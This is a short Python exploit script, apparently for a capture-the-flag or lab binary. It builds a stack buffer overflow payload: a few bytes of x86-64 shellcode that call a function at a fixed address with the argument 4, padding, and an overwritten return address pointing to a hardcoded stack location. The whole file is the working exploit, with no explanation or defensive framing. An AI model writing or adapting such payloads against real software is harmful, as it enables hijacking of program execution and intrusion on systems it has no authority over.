import sys
from struct import pack

ADDR = 0x721000800fd0

shellcode  = bytes.fromhex("bf04000000")
shellcode += bytes.fromhex("b8871a4000")
shellcode += bytes.fromhex("ffd0")

payload  = shellcode + b"A" * (16 - len(shellcode))
payload += b"B" * 8
payload += pack("<Q", ADDR)

sys.stdout.buffer.write(payload + b"\n")
